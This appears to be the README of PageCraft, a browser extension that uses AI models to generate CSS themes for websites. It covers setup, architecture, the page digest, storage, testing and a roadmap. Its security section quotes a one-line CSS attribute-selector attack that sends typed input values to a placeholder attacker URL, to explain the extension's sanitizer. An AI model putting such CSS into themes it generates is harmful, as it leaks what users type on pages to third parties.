PageCraft

A Chrome and Firefox (Manifest V3) extension that creates dedicated CSS themes for websites from plain-language instructions, using Anthropic, OpenAI, Gemini or a local model. You can also write and edit the CSS by hand.

Generated output is CSS only. MV3 store policies forbid running remotely generated JavaScript, and CSS covers theming. Optional JS tweaks would need the opt-in userScripts API (see roadmap).

Setup & build

Requires Node.js 22+ (WXT 0.21 needs it; Node 20 reached end-of-life in April 2026). The repo includes an .nvmrc.

npm install            # also runs `wxt prepare` (generates .wxt/ types)
npm run dev            # Chrome with hot reload (opens a dev browser)
npm run dev:firefox    # Firefox MV3 with hot reload
npm run build          # → .output/chrome-mv3/
npm run build:firefox  # → .output/firefox-mv3/
npm run zip            # store-ready zip (add :firefox for AMO; also creates a sources zip)
npm run compile        # type-check only

Load a build manually

  • Chrome / Edge / Brave: chrome://extensions → Developer mode → Load unpacked → choose .output/chrome-mv3.
  • Firefox: about:debugging#/runtime/this-firefox → Load Temporary Add-on… → choose .output/firefox-mv3/manifest.json.

The manifest is generated from wxt.config.ts and the entrypoints. Don't edit .output/. The old manifest.js / manifest.json are gone.

Using it

  1. Open AI settings from the popup. Pick a provider, add a key if it needs one, choose a model with Load models, press Test connection, then Save.
  2. On any website, open the popup → CustomStyle editor. The editor opens in a new tab linked to the site's tab.
  3. Describe the theme (e.g. “warm dark theme, amber accents, larger body text”) and press Generate or Ctrl+Enter. CSS streams into the editor, and Live preview shows it on the site tab.
  4. Refine: with Refine current checked, the current CSS goes along with your next instruction so the model edits it instead of starting over.
  5. Save (Ctrl+S) stores the style and applies it to that hostname. The popup's MyStyles list lets you switch styles per site.

Closing the editor drops the unsaved preview. The site goes back to its saved style.

Ollama blocks extension origins by default (HTTP 403). Allow them, then restart Ollama: 
# Windows (PowerShell, persistent)
setx OLLAMA_ORIGINS "chrome-extension://*,moz-extension://*"
# macOS
launchctl setenv OLLAMA_ORIGINS "chrome-extension://*,moz-extension://*"
# Linux (systemd): add Environment="OLLAMA_ORIGINS=..." via `systemctl edit ollama`

Model lists are fetched live from each provider's models endpoint, so no model IDs are hardcoded beyond the Anthropic default.

Architecture

Built with WXT and TypeScript (no UI framework). AI requests go out from the extension pages (editor, settings), not from a background service worker. Extension pages get the same cross-origin access from host_permissions. Running there also avoids Chrome ending a long streaming request when an idle MV3 service worker is suspended, and keys never enter page context.

PathRole
wxt.config.tsManifest source: permissions, icons, Firefox gecko id (added to Firefox builds only).
entrypoints/content.tsRuns on every page at document_start. Applies preset + legacy CSS + selected style (or live preview) in one <style>. Answers digest requests and accepts the preview port.
entrypoints/popup/Toolbar popup: on/off, global preset, per-site style, open editor/settings.
entrypoints/editor/editor.html. main.ts handles style CRUD, generation and preview. code-editor.ts is the textarea editor behind a small API, so CodeMirror can replace it.
entrypoints/options/AI settings page: provider, key, base URL, model list, connection test.
lib/storage.tsTyped access to storage.local (themes and AI settings) with defaults.
lib/ai/providers.tsProvider layer: one streamText() API over three wire formats, SSE parser, listModels(), helpful error hints.
lib/ai/prompt.tsSystem prompt (theming rules) and user message builder.
lib/ai/sanitize.tsExtracts CSS from model output and strips external references (see security).
lib/digest.tsBuilds the compact page description sent to the model.
lib/messages.tsMessage and port contracts between pages and the content script.

Generation pipeline

DigestContent script describes the page with PageCraft's own sheet off.
PromptSystem rules + digest + current CSS (when refining) + instructions.
StreamProvider streams text. The editor shows the extracted CSS live.
SanitizeStrip @import and external url(), then re-parse in the browser.
Preview → SaveApplied to the tab over a port. Saved only on explicit Save.

Page digest contents

URL (origin + path, no query string), title, language, declared color-scheme, up to 80 :root CSS custom properties, the main background and text colors, fonts, and a DOM outline (max 220 lines, depth 9). The outline lists tag#id.class [role aria-label data-*], collapses repeated siblings (li ×24) and leaves out hashed class names. No text content or form values are included.

Prompt rules (summary)

Output one ```css block. Override site CSS variables first. Use stable selectors (roles, attributes, semantic classes). Keep WCAG AA contrast. Don't hide content. Style hover/focus states, forms, code and tables. No remote resources. When refining, return the full updated stylesheet.

Data model

Everything lives in browser.storage.local (never sync):

enabled: boolean                    // global on/off
preset: "none" | "dark" | "light"
styles: { [hostname]: css }         // legacy 1.0 per-host CSS, still applied
myStyles: [{ id, name, css, prompt?, updatedAt? }]
selectedMyStyles: { [hostname]: styleId }
ai: {
  activeProvider: "anthropic" | "openai" | "gemini" | "local",
  providers: { [id]: { apiKey, baseUrl, model } }
}

The content script refreshes only when a theme key changes. Saving AI settings doesn't re-render pages.

Security & privacy

  • CSS data leaks. CSS can send page data out, e.g. input[value^="a"] { background: url(https://attacker/a) }. Generated CSS therefore has @import, every non-data: url(), external image-set() strings, -moz-binding/behavior and expression() removed. It is then re-parsed with CSSStyleSheet.replaceSync. If anything external is left after that (e.g. hidden with CSS escapes), the normalized output is used and stripped again. A warning lists the fixes.
  • CSS you type by hand is not sanitized. It's yours.
  • API keys are stored unencrypted in extension-local storage and sent only to the configured base URL. Web pages can't read extension storage.
  • Data sent on Generate: instructions, current CSS (if refining), page digest. The settings page says this too. This replaces the 1.0 “no network requests” claim.
  • Permissions: storage, activeTab, <all_urls> host access (applying themes + calling provider APIs, localhost included). Narrowing these is on the roadmap.

Testing

Automated: npm run compile (strict TypeScript) and both browser builds pass. Unit tests aren't set up yet. Manual smoke test, per browser:

  1. Global preset applies to HTTP(S) pages. Toggling PageCraft off removes all PageCraft CSS.
  2. Hand-written style saves, applies to its hostname and survives reload. Data from 1.0 still applies.
  3. For each provider: Load models → Test connection → Generate on a real site (e.g. Wikipedia, GitHub). CSS streams, preview updates the tab, Save persists it.
  4. Stop mid-generation keeps the partial CSS unsaved. A bad key shows a readable error.
  5. Refine: a second instruction changes only what you asked for.
  6. Close the editor without saving: the tab goes back to the saved style.
  7. Ollama without OLLAMA_ORIGINS shows the 403 hint.

Roadmap & to-do

Phase 1: Essentials done

  • Migrate to WXT + TypeScript
    One codebase builds Chrome MV3 and Firefox MV3. Generated manifests. All 1.0 features kept.
  • Provider layer for Anthropic, OpenAI, Gemini, local
    Streaming, model listing, connection test, error hints (401/403, Ollama origins).
  • AI settings page
    Per-provider key/base URL/model, remembered while switching providers.
  • Page digest, theming prompt and CSS sanitizer
    Replaces the ComfyUI placeholder (ComfyUI is for images, not text→CSS).
  • Live preview, refine and stop
    Preview over a port, cleared when the editor closes.

Phase 2: Harden what exists next

  • Manual smoke test in Chrome and Firefox with every provider blocker
    Builds pass, but no real browser test has run yet. Follow the checklist.
  • Undo / version history for generations high
    Replacing the textarea value clears native undo. Keep the last N versions per style plus a “Revert” button.
  • Inject into tabs that were open before install high
    Those tabs have no content script, so digest and preview fail until reload. Add the scripting permission and inject on demand.
  • Firefox host-permission check high
    Firefox lets users withhold <all_urls>. Check with permissions.contains and ask from the popup.
  • Unit tests with Vitest + WXT testing plugin
    Cover extractCss, sanitizeCss (escape tricks), SSE parsing per provider (recorded fixtures), prompt building.
  • AST-based sanitizer with css-tree
    Swap the regex + re-parse approach for an allow-list walk of the CSS tree.
  • Resize the icon
    icon.png is 1.16 MB. Ship 16/32/48/128 px PNGs (stores reject oversized assets).
  • Firefox AMO metadata
    Add data_collection_permissions to gecko settings (required for new AMO listings) and state that data goes to AI providers.

Phase 3: Better themes later

  • Replace the editor with CodeMirror 6
    Implement the same CssEditor API (value, onChange, setReadOnly). Adds lint, real undo, search, color swatches.
  • Two-step generation: design tokens → CSS
    Model writes a JSON palette/typography/radius first, then maps it to the site. Add a token editor to tweak colors without regenerating.
  • Conversation-style refinement
    Keep the instruction history per style and send recent turns. Show it as a chat in the editor.
  • Screenshot input for vision models
    tabs.captureVisibleTab, opt-in, downscaled. Then a “check my theme” pass that critiques a screenshot of the result.
  • Contrast checker
    Measure text/background contrast on the previewed page and feed failures back into a fix-up prompt.
  • Better injection
    @layer pagecraft, all_frames for iframes, open Shadow DOM roots, single-page-app route changes.

Phase 4: Product polish later

  • Host patterns and global themes
    Match *.example.com, path rules, or apply a theme everywhere.
  • Import / export themes as JSON
    Backup, sharing, and later a community gallery.
  • Narrower permissions
    Ask for site and provider hosts at runtime (optional_host_permissions) instead of <all_urls>. Faster store review.
  • Optional API key encryption
    Passphrase-derived key (PBKDF2 + AES-GCM through WebCrypto), unlocked once per session.
  • Token and cost estimate before sending
    Show digest size, plus a setting for the digest budget.
  • CI and store publishing
    GitHub Actions: compile, test, wxt zip for both browsers. wxt submit to the Chrome Web Store and AMO.
  • Localisation (i18n)
    Use WXT's i18n module for UI strings.
  • Optional JavaScript tweaks via userScripts
    Only if needed. The user must enable it in the browser, and it needs separate review. CSS stays the default.
